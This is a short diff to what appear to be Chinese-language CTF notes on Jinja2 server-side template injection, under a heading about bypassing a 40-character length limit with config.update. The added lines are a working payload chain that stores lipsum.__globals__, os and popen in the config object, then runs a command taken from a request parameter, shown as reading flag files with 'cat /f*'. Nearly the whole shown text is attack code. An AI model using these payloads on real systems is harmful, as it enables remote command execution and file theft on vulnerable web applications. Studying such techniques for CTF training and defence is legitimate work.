@@ -286,3 +286,10 @@ set+update方法绕过长度限制最大长度40
 {%print(config)%}                          //输出config字典的所有键值对
 {%print(config.o)%}                        //输出
 ```
+类似的
+```
+{{config.update(f=lipsum.__globals__)}}
+{{config.update(o=config.f.os)}}
+{{config.update(p=config.o.popen)}}
+{{config.p(request.args.c).read()}}&c=cat /f*
+```
